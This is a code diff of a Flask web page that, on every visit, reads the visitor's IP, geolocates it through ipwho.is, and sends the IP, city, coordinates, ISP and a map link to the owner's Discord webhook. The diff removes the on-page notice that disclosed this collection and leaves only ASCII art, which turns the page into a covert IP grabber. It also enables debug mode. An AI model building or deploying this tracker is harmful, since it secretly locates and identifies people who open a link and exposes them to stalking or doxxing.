@@ -5,228 +5,214 @@ from datetime import datetime, timezone
 
 import requests
 from flask import Flask, request
-from werkzeug.middleware.proxy_fix import ProxyFix
 
 app = Flask(__name__)
 
-# Render работает перед Flask как прокси.
-# Доверяем одному прокси при определении IP клиента.
-app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1)
-
-# Секретная ссылка будет храниться в настройках Render
+# Discord Webhook берётся из настроек Vercel
 WEBHOOK_URL = os.environ.get("DISCORD_WEBHOOK")
 
 
+def get_visitor_ip():
+    # На Vercel запросы проходят через прокси
+    forwarded = request.headers.get("X-Forwarded-For", "")
+
+    ip = forwarded.split(",")[0].strip()
+
+    if not ip:
+        ip = request.remote_addr
+
+    try:
+        ipaddress.ip_address(ip)
+        return ip
+    except (ValueError, TypeError):
+        return "Unknown"
+
+
 def get_location(ip):
-    # Проверяем, является ли IP публичным
     try:
         address = ipaddress.ip_address(ip)
+
         if not address.is_global:
             return {}
-    except ValueError:
-        return {}
 
-    try:
         response = requests.get(
             f"https://ipwho.is/{ip}",
-            timeout=5
+            timeout=3
         )
-        response.raise_for_status()
 
+        response.raise_for_status()
         data = response.json()
 
         if data.get("success"):
             return data
 
-    except requests.RequestException as error:
-        print("Ошибка геолокации:", error)
-    except ValueError:
-        print("Сервис вернул некорректный JSON")
+    except Exception as error:
+        print("Geolocation error:", error)
 
     return {}
 
 
 def send_to_discord(ip, data):
     if not WEBHOOK_URL:
-        print("DISCORD_WEBHOOK не настроен")
+        print("Discord webhook not configured")
         return
 
     connection = data.get("connection") or {}
-    location_timezone = data.get("timezone") or {}
+    timezone_data = data.get("timezone") or {}
 
-    def value(item):
-        if item is None or item == "":
-            return "Неизвестно"
-        return str(item)
+    def show(value):
+        if value is None or value == "":
+            return "Unknown"
+        return str(value)
 
     latitude = data.get("latitude")
     longitude = data.get("longitude")
 
-    maps_url = "Недоступна"
+    maps = "Unavailable"
 
     if isinstance(latitude, (int, float)) and isinstance(
         longitude, (int, float)
     ):
-        maps_url = (
-            f"https://www.google.com/maps"
+        maps = (
+            "https://www.google.com/maps"
             f"?q={latitude},{longitude}"
         )
 
-    fields = [
-        ("IP", ip),
-        ("Тип IP", data.get("type")),
-        ("Континент", data.get("continent")),
-        ("Страна", data.get("country")),
-        ("Код страны", data.get("country_code")),
-        ("Регион", data.get("region")),
-        ("Город", data.get("city")),
-        ("Почтовая зона", data.get("postal")),
-        ("Широта", latitude),
-        ("Долгота", longitude),
-        ("Провайдер", connection.get("isp")),
-        ("Организация", connection.get("org")),
-        ("ASN", connection.get("asn")),
-        ("Домен сети", connection.get("domain")),
-        ("Часовой пояс", location_timezone.get("id")),
-        ("UTC", location_timezone.get("utc")),
-        ("Время визита", datetime.now(
+    details = {
+        "IP": ip,
+        "Country": data.get("country"),
+        "Country Code": data.get("country_code"),
+        "Continent": data.get("continent"),
+        "Region": data.get("region"),
+        "City": data.get("city"),
+        "Postal Code": data.get("postal"),
+        "Latitude": latitude,
+        "Longitude": longitude,
+        "ISP": connection.get("isp"),
+        "Organization": connection.get("org"),
+        "ASN": connection.get("asn"),
+        "Timezone": timezone_data.get("id"),
+        "Time": datetime.now(
             timezone.utc
-        ).strftime("%Y-%m-%d %H:%M:%S UTC")),
-    ]
+        ).strftime("%Y-%m-%d %H:%M:%S UTC")
+    }
 
     description = "\n".join(
-        f"**{name}:** {value(item)}"
-        for name, item in fields
+        f"**{key}:** {show(value)}"
+        for key, value in details.items()
     )
 
     description += (
-        f"\n\n**Google Maps:** {maps_url}"
-        "\n_Геолокация приблизительная._"
+        f"\n\n**Google Maps:** {maps}"
+        "\n*Location is approximate.*"
     )
 
     payload = {
-        "username": "SIGNAL Monitor",
+        "username": "gr8w",
         "allowed_mentions": {"parse": []},
         "embeds": [
             {
-                "title": "🌐 Новый посетитель",
+                "title": "New Website Visitor",
                 "description": description[:4096],
-                "color": 5764768,
+                "color": 16777215
             }
-        ],
+        ]
     }
 
     try:
         response = requests.post(
             WEBHOOK_URL,
             json=payload,
-            timeout=8
+            timeout=3
         )
         response.raise_for_status()
-        print("Отчёт отправлен в Discord")
+        print("Discord notification sent")
 
     except requests.RequestException as error:
-        print("Ошибка отправки в Discord:", error)
+        print("Discord error:", error)
 
 
 @app.route("/")
 def home():
-    ip = request.remote_addr or "Unknown"
-
-    print("Новый посетитель:", ip)
+    ip = get_visitor_ip()
 
     location = get_location(ip)
     send_to_discord(ip, location)
 
-    return """
-    <!DOCTYPE html>
-    <html lang="ru">
-    <head>
-        <meta charset="UTF-8">
-        <meta name="viewport"
-              content="width=device-width, initial-scale=1">
+    return r"""
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport"
+          content="width=device-width, initial-scale=1">
 
-        <title>SIGNAL</title>
+    <title>gr8w</title>
 
-        <style>
-            body {
-                background: #080d0c;
-                color: #52f0a0;
-                font-family: Consolas, monospace;
-                min-height: 100vh;
-                margin: 0;
-                display: flex;
-                justify-content: center;
-                align-items: center;
-            }
+    <style>
+        * {
+            box-sizing: border-box;
+        }
 
-            .terminal {
-                width: min(90%, 850px);
-                border: 1px solid #225c43;
-                border-radius: 12px;
-                padding: 25px;
-                background: #101914;
-                box-shadow: 0 0 50px #103d2480;
-                text-align: center;
-            }
+        html, body {
+            margin: 0;
+            width: 100%;
+            min-height: 100%;
+            background: #000;
+        }
 
-            pre {
-                color: #52f0a0;
-                font-size: clamp(5px, 1.4vw, 13px);
-                overflow-x: auto;
-                text-align: center;
-            }
+        body {
+            min-height: 100vh;
+            min-height: 100dvh;
 
-            h1 {
-                color: white;
-                letter-spacing: 3px;
-            }
+            display: flex;
+            justify-content: center;
+            align-items: center;
 
-            p {
-                color: #80ab94;
-            }
+            overflow-x: auto;
+        }
 
-            .online {
-                text-align: left;
-                border-bottom: 1px solid #225c43;
-                padding-bottom: 15px;
-            }
+        pre {
+            color: #fff;
+            background: transparent;
 
-            .footer {
-                font-size: 11px;
-                margin-top: 35px;
-                opacity: 0.65;
-            }
-        </style>
-    </head>
+            font-family: Consolas, "Courier New", monospace;
+            font-size: clamp(5px, 1.25vw, 16px);
+            font-weight: normal;
+            line-height: 1.1;
 
-    <body>
-        <div class="terminal">
-            <div class="online">
-                ● SIGNAL.EXE — ONLINE
-            </div>
+            white-space: pre;
+            margin: 0;
+            padding: 16px;
 
-            <pre>
-  ____ ___ ____ _   _    _    _
- / ___|_ _/ ___| \\ | |  / \\  | |
- \\___ \\| | |  _|  \\| | / _ \\ | |
-  ___) | | |_| | |\\  |/ ___ \\| |___
- |____/___\\____|_| \\_/_/   \\_\\_____|
-            </pre>
+            text-align: left;
+        }
+    </style>
+</head>
 
-            <h1>CONNECTION ESTABLISHED</h1>
-            <p>Welcome to the other side.</p>
+<body>
+<pre>
+                       ,---.-,
+                      '   ,'  '.
+                     /   /      \
+                    .   ;  ,/.  :
+             __  ,-.'   |  | :  ;         .---.
+  ,----._,.,' ,'/ /|'   |  ./   :        /. ./|
+ /   /  ' /'  | |' ||   :       ,     .-'-. ' |
+|   :     ||  |   ,' \   \     /     /___/ \: |
+|   | .\  .'  :  /    ;   ,   '\  .-'.. '   ' .
+.   ; ';  ||  | '    /   /      \/___/ \:     '
+'   .   . |;  : |   .   ;  ,/.  :.   \  ' .\
+ `---`-'| ||  , ;   '   |  | :  ; \   \   ' \ |
+ .'__/\_: | ---'    '   |  ./   :  \   \  |--"
+ |   :    :         |   :      /    \   \ |
+  \   \  /           \   \   .'      '---"
+   `--`-'             `---`-'
+</pre>
+</body>
+</html>
+"""
 
-            <p class="footer">
-                ACCESS GRANTED // SYSTEM ONLINE
-            </p>
 
-            <p class="footer">
-                Сайт получает IP посетителя, определяет
-                приблизительный регион через ipwho.is
-                и отправляет сведения владельцу в Discord.
-            </p>
-        </div>
-    </body>
-    </html>
-    """
+if __name__ == "__main__":
+    app.run(debug=True)
